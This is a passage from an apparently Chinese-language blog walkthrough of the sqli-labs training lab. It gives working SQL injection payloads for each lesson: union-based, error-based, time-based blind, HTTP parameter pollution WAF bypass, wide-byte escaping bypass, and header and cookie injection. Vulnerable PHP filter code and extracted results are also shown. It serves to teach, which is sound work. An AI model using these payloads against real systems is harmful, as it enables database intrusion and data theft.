思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&amp;<br><br>  ?id=1%27%26%26%271=1 猜测为’ ‘<br><br>  ?id=1%27)%26%26(%271=1 猜测为（’ ‘）<br><br>  ?id=1%22%26%26%221=1 猜测为 “ “<br><br>  ?id=1%22)%26%26(%221=1 猜测为(“ “)<br><br>  ?id=1)%26%26(1=1  猜测为()<br><br>  ?id=1%26%261=1 无<br><br>等诸如此类<br></p>\n</li>\n<li><p><strong>less 27 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union\n$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select\n$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION\n$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT\n$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union\n$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out select\nreturn $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br></p>\n<p>  思路一：大小写绕过<br><br>  ?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27<br><br>  思路二：报错或延时？</p>\n</li>\n<li><p><strong>less 27a GET - Blind Based - All your UNION &amp; SELECT Belong to us -Double Quotes</strong><br><br>  1.?id=1%22%26%26%221=1 成功，猜测为“ “过滤<br><br>  2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入<br></p>\n</li>\n<li><p><strong>less 28 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes with Parentesis</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);                //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);                //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);                    //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);                    Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.\nreturn $id;\n}\n $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre><p>  ?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27</p>\n<ul>\n<li><strong>less 28a GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes - Parentesis</strong><br><pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out spaces.\nreturn $id;\n}\n$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre>?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同</li>\n</ul>\n</li>\n<li><p><strong>less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application</strong><br><br>服务器（两层架构）<br><br>  当?id=1&amp;id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容<br><br>  此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 <br><br>  ?id=1&amp;id=-2%27union%20select%201,user(),version()%27<br><br>  返回:<br><br>Your Login name:root@localhost<br><br>  Your Password:5.7.23-0ubuntu0.16.04.1</p>\n</li>\n<li><p><strong>less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong><br><br>  ?id=1&amp;id=-2%22union%20select%201,user(),version()%22</p>\n</li>\n<li><p><strong>less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong> <br><br>  ?id=1&amp;id=-2”)union%20select%201,user(),version()%23</p>\n</li>\n<li><p><strong>less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars</strong><br><br>宽字节注入<br><br>  原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。<br><br>一般有两种思路： <br><br>  1、%df 吃掉 \\ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。<br><br>  2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。<br></p>\n<p>  addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：’   “  \\<br><br>  addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行</p>\n<pre><code>function check_addslashes($string)\n{\n    $string= addslashes($string);    \n    return $string;\n}\n</code></pre><p>  例?id=-1%27%20union%20select%201,version(),user()%20%27<br><br>  The filtered request is :-1\\’ union select 1,version(),user() \\’<br></p>\n<p>  ?id=-1%df%27%20union%20select%201,version(),user()%23<br><br>  返回:<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:root@localhost</p>\n</li>\n<li><p><strong>less 33 GET -  Bypass AddSlashers()</strong><br><br>  ?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样</p>\n</li>\n<li><p><strong>less 34 POST - Bypass AddSlashers()</strong><br><br>  post型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为’ 。我们就 可以利用这个方式进行尝试。<br></p>\n<p>  運’ or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c <br><br>  SELECT username, password FROM users WHERE username=’運\\’ or 1=1# ‘ and password=’’ LIMIT 0,1</p>\n</li>\n<li><p><strong>less 35 GET - Bypass Add Slashes(we dont need them) Integer Based</strong><br><br>  php中：$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  可以看出，不需要构造特殊符号<br><br>  ?id=-1%20union%20select%201,version(),user()%23<br></p>\n</li>\n<li><p><strong>less 36 GET - Bypass mysql_real _escape _string</strong><br><br>  mysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符<br><br>  string 必需，要转义的字符串<br><br>  connection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接<br></p>\n<pre><code>\\x00  ascii码 null\n\\n    换行\n\\r    回车\n\\\n&apos;\n&quot;\n\\x1a （即十进制26）&amp;\n</code></pre><p>  这些字符会被转义<br></p>\n<pre><code>function check_quotes($string)\n{\n    $string= mysql_real_escape_string($string);    \n    return $string;\n}\n$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;\n</code></pre><p>  ?id=-1%df%27%20union%20select%201,version(),user()%23 成功</p>\n</li>\n<li><p><strong>less 37 POST - Bypass mysql_real_escape_string</strong> <br><br>  運’ or 1=1 #</p>\n</li>\n</ul>\n<hr>\n<p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 <br><br>原理:<br><br>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 <br><br>局限:<br><br>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 <br><br>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息<br></p>\n<p>暂不深入了解</p>\n<hr>\n<p>challenge</p>\n<ul>\n<li><p><strong>GET - challenge - Union -10 Queries Allowed - Variation1</strong><br><br>  1.查表名<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  得到此次的表名: 8TELU525VO<br><br>  2.查列名 用concat一次性查完输出<br><br>  ?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23<br><br>  返回:<br><br>Your Login name:id—,sessid—,secret_63JY—,tryy—<br><br>  Your Password:3<br><br>  3.得到密码id,sessid,secret_63JY<br><br>  ?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23<br><br>  返回:<br><br>Your Login name:856213ca887976a33e3d91b2c61fa65a<br><br>  Your Password:M5ztHsC34iN2X0lzCiXJ27Cp<br><br>  4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 2</strong><br><br>  1.猜测过滤规则<br><br>  当输入?id=1)%26%26(1=1 时 成功 可知过滤为()<br><br>  2.参考less 54<br><br>  ?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  表名为: C73JPUKYS9    <br><br>  ?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d<br>  %22C73JPUKYS9%22),3%20%23<br><br>  列名: Your Login name:id—,sessid—,secret_DH0J—,tryy—<br><br>  ?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23<br><br>  密码：<br><br>Your Login name: 4d0218b33a232f675d53381ef38b5370<br><br>Your Password: kjbKG19I62vmYE3kS7gGN7qf <br> 成功</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 3</strong><br><br>  1.猜测<br><br>  ?id=1%27)%26%26(%271=1 成功 可知为(‘ ‘)<br><br>  2.下面步骤如上<br></p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 4</strong><br><br>  如上</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 1</strong><br><br>  1.猜测<br><br>  ?id=1%27%26%26%271=1 成功，可知为’ ‘<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 <br>  返回同上，可知有其它过滤规则<br><br>  尝试报错注入<br><br>  ?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()<br><br>  2.获取表名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23<br><br>  返回：XPATH syntax error: ‘~4HT916R6T1~’<br><br>  3.获取列名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,”—“)%20from%20information_schema.columns%20where%20table_name%3d%20”4HT916R6T1”),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~id—,sessid—,secret_EN0R—,’为什么有一个列没显示<br><br>  4.获取密码<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~OcDGOovBkd3XMq3FpuSNtEIN~’<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 2</strong><br><br>  ?id=1%26%261=1 返回成功，说明无字符<br><br>  剩余步骤如 less 58<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 3</strong><br> ?id=1%22%26%26%221=1 猜测为 “ “<br><br>?id=1%22)%26%26(%221=1 猜测为(“ “) <br><br>都返回相同结果？？？？<br><br>但实际上</p>\n<pre><code>$id = &apos;(&quot;&apos;.$id.&apos;&quot;)&apos;;\n  $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;\n     if($row)\n      {\n          echo &apos;&lt;font color= &quot;#00FFFF&quot;&gt;&apos;;\n          $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);\n          $pass = array_reverse($unames);\n          echo &apos;Your Login name : &apos;. $unames[$row[&apos;id&apos;]];\n          echo &quot;&lt;br&gt;&quot;;\n          echo &apos;Your Password : &apos; .$pass[$row[&apos;id&apos;]];\n          echo &quot;&lt;/font&gt;&quot;;\n      }\n      else\n      {\n          echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;\n          print_r(mysql_error());\n          echo &quot;&lt;/font&gt;&quot;;  \n      }\n</code></pre><p> 每次返回都是$unames=array（），奸诈！！</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 4</strong><br><br>  $sql=”SELECT * FROM security.users WHERE id=((‘$id’)) LIMIT 0,1”;</p>\n</li>\n<li><p><strong>GET - Challenge - Blind -130 Queries Allowed - Variation 1</strong><br><br>  盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率<br><br>  ?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))–+</p>\n</li>\n</ul>\n<h3 id=\"三-杂记\"><a href=\"#三-杂记\" class=\"headerlink\" title=\"三.杂记\"></a>三.杂记</h3><ul>\n<li><p>盲注<br><br>  语句执行完后没有回显<br><br>  1.基于布尔<br><br>  构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）<br><br>  2.基于报错<br><br>  SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2));<br><br>  [Err] 1062 - Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘&lt;group_key&gt;’<br><br>  具体原理不懂，concat, floor, group by，rand(0)是关键<br><br>  如果rand被禁用可以使用用户变量来报错？？<br><br>  或者XPath报错等<br><br>  3.基于时间-延迟注入<br><br>  利用if,当条件正确或错误时，确定要不要sleep()来猜测<br></p>\n</li>\n<li><p>insert/update/delete注入<br><br>  思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br></p>\n</li>\n<li><p>order by<br><br>可以用来确定有几列，如 order by 4 ,报错没有第四列<br></p>\n</li>\n<li><p>url编码</p>\n<pre><code>空格    -    %20\n&quot;          -    %22\n#         -    %23\n%        -    %25\n&amp;         -    %26\n(          -    %28\n)          -    %29\n+         -    %2B\n,          -    %2C 逗号\n/          -    %2F\n:          -    %3A\n;          -    %3B\n&lt;         -    %3C\n=         -    %3D\n&gt;         -    %3E\n?         -    %3F\n@       -    %40\n\\          -    %5C\n|          -    %7C\n&apos;               %27  单引号\n</code></pre></li>\n<li><p>补充一些数据库知识<br></p>\n<pre><code>infomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n如数据库名，数据库的表，表栏的数据类型与访问权限等。&lt;/br&gt;\n再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。&lt;/br&gt;\n\ninformation_schema的表schemata中的列schema_name记录了所有数据库的名字\ninformation_schema的表tables中的列table_schema记录了所有数据库的名字\ninformation_schema的表tables中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列table_schema记录了所有数据库的名字\ninformation_schema的表columns中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n</code></pre><p>查询指定数据库所有表名<br><br>SELECT table_name FROM information_schema.tables WHERE table_schema=’数据库名’;<br><br>查询mysql中所有数据库名字<br><br>SELECT schema_name FROM information_schema.schemata<br></p>\n<p>  version()  mysql版本<br>  user()用户<br>  @@datadir数据路径<br>  @@version_compile_os 操作系统<br>  database() 数据库名字<br>  SELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();<br>–+/# 注释，一般用#，url编码为%23<br><br><br>mysql中XPath:<br><br>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()<br><br>ExtractValue():<br><br>  EXTRACTVALUE (XML_document, XPath_string); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  作用：从目标XML中返回包含所查询值的字符串<br><br>UpdateXml():<br><br>  UPDATEXML (XML_document, XPath_string, new_value); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  第三个参数：new_value，String格式，替换查找到的符合条件的数据 <br><br>  作用：改变文档中符合条件的节点的值 <br><br>通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br><br>0x7E为~的ascii码<br><br><br>if<br><br>IF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3<br><br><br>concat() 连接字符串，将多个连接在一起。<br><br>  concat(str1,str2,…)<br><br>concat_ws() 将多个字符串连接在一起，可以一次性指定分隔符<br><br>  concat_ws(sparator, str1,str2,…)<br><br>group_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果<br><br>  group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )<br></p>\n</li>\n</ul>\n<ul>\n<li><p>问题：<br><br>1.怎么确定是哪种注入类型？<br><br>2.在没有返回值的情况下判断单引号双引号括号等</p>\n</li>\n<li><p>其它</p>\n<pre><code>?id=1%27%26%26%271=1 猜测为’ ‘\n?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n?id=1%22%26%26%221=1 猜测为 &quot; &quot;\n?id=1%22)%26%26(%221=1 猜测为(&quot; &quot;)\n?id=1)%26%26(1=1  猜测为()\n?id=1%26%261=1 无\n</code></pre></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>sql注入:利用现有程序，使之执行构造的payload.</p>\n<h3 id=\"一-环境搭建\"><a href=\"#一-环境搭建\" class=\"headerlink\" title=\"一. 环境搭建\"></a>一. 环境搭建</h3><ul>\n<li>ubuntu16.04虚拟机</li>\n<li>更新阿里源 apt-get update</li>\n<li>安装mysql apt-get install mysql-server mysql-client -y</li>\n<li>安装apache apt-get install apache2 -y</li>\n<li>安装git apt-get install git -y</li>\n<li>项目 cd /var/www &amp;&amp; sudo git clone <a href=\"https://github.com/Audi-1/sqli-labs.git\" target=\"_blank\" rel=\"noopener\">https://github.com/Audi-1/sqli-labs.git</a> sqli-labs  </li>\n<li>更改项目的mysql配置文件为自己数据库</li>\n<li>现在在浏览器localhost/sqli-labs已经可以访问到了</li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>navicat连不上mysql <br><br>  注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1<br><br>  修改select user, host from user;  update user set host = “%” where host = ‘localhost’;  flush privileges;</li>\n<li><p>php版本导致mysql_connect()废弃 <br><br>  安装phpstorm 配置phpcgi  apt-get install php版本-cgi<br><br>  降低版本到php5.6错误仍然在<br><br>  第二天重启Phpstrom 打开网页，错误消失<br><br>猜测是降低版本有效，但第一天有缓存<br></p>","more":"<h3 id=\"二-sqli-labs\"><a href=\"#二-sqli-labs\" class=\"headerlink\" title=\"二.sqli-labs\"></a>二.sqli-labs</h3><p>参考了大牛的教程<a href=\"https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\" target=\"_blank\" rel=\"noopener\">https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf</a></p>\n</li>\n<li><p><strong> less1 GET-Error based - Single quotes - String <br> </strong><br>  php中代码 SELECT * FROM users WHERE id=’$id’ LIMIT 0,1;<br>  %20 空格 %27 单引号 %3D 等于号<br><br>  一：?id=(select%20id%20from%20users%20where%20username%20%3D”admin”) 未成功      ’$id’ 注入被单引号包裹，将输入变成了字符串<br><br>  二：?id=’%20and%20username%3D%27admin 未成功 id=’’这个条件未绕过<br>  想利用id=这个条件或者绕过这个条件<br><br>  三：?id=’%20or%20username%3D%27admin 成功<br><br>  基于二，转换思路，利用or成功绕过<br><br>  爆破数据库版本<br><br>  ?id=-1%27%20%20union%20select%201%2cversion()%2c3%23<br><br>  ？id=-1’  union select 1,version(),3#<br><br>  union必须列一样，所以1和3是为了保持三列</p>\n</li>\n<li><p><strong> less 2 GET - Error based -Intiger based<br> </strong><br>  php中代码 $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  $id未加引号过滤输入<br> ?id=(select%20id%20from%20users%20where%20username%20%3D”admin”)成功注入</p>\n</li>\n<li><p><strong> less 3 GET - Error based - single quotes with twist - string</strong><br><br>  php中代码 $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”; 用括号和单引号进行了过滤<br><br>  思路：消除括号<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27  成功</p>\n</li>\n</ul>\n<ul>\n<li><p><strong> less 4  GET - Error based - Double Quotes - String </strong> <br><br>  php中代码<br><br>  $id = ‘“‘ . $id . ‘“‘;<br><br>  $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27 成功<br></p>\n<p>  关于前四个less的一些心得：</p>\n<pre><code>1.找错误：\n    尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    例：?id=&quot;\n             返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&quot;&quot;) LIMIT 0,1&apos; at line 1\n        可以看出输入所在位置为（“输入”）\n2.注入利用\n    通过union来执行自己想要的sql\n</code></pre></li>\n<li><p><strong> less 5  GET - Double Injection - Single Quotes - String </strong> <br><br>双查询注入（双查询：select嵌套select）<br><br>  输入?id=‘ 失败， use near 1  由此猜测为单引号<br><br>  ?id=’%20or%20username%3D%27admin 成功 <br><br>  但是sql执行结果前端并没有进行输出，怎么利用？<br></p>\n<p>  查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。<br><br>  发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）<br><br>  count() 计数<br><br>  rand() 随机<br><br>  group by 分组<br><br>  floor() 向下取整，舍弃小数部分<br></p>\n<p>  ?id=-1%27%20union%20select%201%2c(select%20count(*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功<br><br>  Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br>  其中version(）是我们希望执行的函数，可以换成其它</p>\n</li>\n<li><p><strong> less 6 GET - Double Injection - Double Quotes - String </strong> <br></p>\n<p>  ?id=-1%22%20union%20select%201%2c(select%20count(*)%20from%        20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功</p>\n</li>\n<li><p><strong> less 7 GET - Dump into outfile - String </strong> <br><br>  文件导入限制条件多，未成功</p>\n</li>\n<li><p><strong> less 8 GET - Blind - Boolian Based - Single Quotes </strong> <br><br>  ?id=-1%27or%201%3d1%23 <br><br>  利用二分与返回结果的正确与否，来猜测验证数据库内容</p>\n</li>\n<li><p><strong> less 9 GET - Blind - Time Based - Single Quotes </strong> <br><br>  ?id=1%27%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23 <br><br>  因为在这正确或者错误都是返回的”you are in” 所以不能区分 <br><br><img src=\"../../../images/security/sql/youarein.png\" alt=\"youarein\"><br>  使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试</p>\n</li>\n<li><p><strong> less 10 GET -Blind - Time Based - Double Quotes </strong> <br><br>  ?id=1”%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23</p>\n</li>\n<li><p><strong> less 11 POST - Error Based -Single Qoutes - String </strong> <br><br>  username:  </p>\n<pre><code>1.admin &apos; # admin用户&lt;/br&gt;\n2.adimn &apos; or 1=1 # 万能&lt;/br&gt;\n3. &apos; union select version(),1 # 等其它操作\n</code></pre><p>  passwd:<br>  因为username已经用#将后面注释了，所以passwd随意输入</p>\n</li>\n<li><p><strong> less 12 POST - Error Based - Double Quotes - String - with twist </strong> <br><br>将less11的单引号改为 “）</p>\n</li>\n<li><p><strong> less 13 POST - Double Injection - Single quotes - String - with twist </strong> <br><br>  username:    ‘) union select (select count(*) from information_schema.schemata group by concat(version(),floor(rand(0)*2))),1 #<br><br>  返回信息Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br><br>  另外这种有正确/错误提示的，都可以二分盲注来猜测验证</p>\n</li>\n<li><p><strong> less 14 POST  - Double Injection - Double quotes - String </strong> <br><br>  less13 ‘) 换为 ”</p>\n</li>\n<li><p><strong> less 15 POST - Blind - Boolean/Time Based -Single Quotes </strong> <br><br>  username: ‘ or 1=1 # 登录成功 <br><br>  思路：利用or/and/if sleep()等来进行猜测<br></p>\n</li>\n<li><p><strong> less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist </strong> <br><br>  将less15 ‘ 换成 “)</p>\n</li>\n<li><p><strong> less 17 POST - Update Query - Error Based - String </strong> <br><br>  这里对用户名进行了过滤<br><br>  利用报错进行注入输出 <br><br>  uname=admin&amp;passwd=11’and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;sub mit=Submit <br><br>  输出结果XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1~’<br><br>报错注入基本都是利用XPath进行报错<br>  有必要去买本书来系统的看一下mysql各种函数</p>\n</li>\n<li><p><strong> less 18 POST - Header Injection - Uagent field - Error Based </strong> <br><br>  这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后<br><br>  php中语句：$insert=”INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (‘$uagent’, ‘$IP’, $uname)”;<br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent<br><br>  将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’<br><br>  返回结果：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong> less 19 POST - Header Injection - Referer Field - Error Based </strong> <br><br>  同less 18,进行了过滤，但执行了$insert=”INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (‘$uagent’, ‘$IP’)”;<br><br>  其中：$uagent = $_SERVER[‘HTTP_REFERER’];<br><br>  将Referer 修改为: ‘or extractvalue(1,concat(0x7e,database())) or’<br><br>  返回: XPATH syntax error: ‘~security’</p>\n</li>\n<li><p><strong> less 20 POST - Cookie Injection - Uagent Field - Error Based </strong> <br><br>  进行了过滤<br><br>  $cookee = $_COOKIE[‘uname’];<br><br>  $sql=”SELECT * FROM users WHERE username=’$cookee’ LIMIT 0,1”;<br><br>  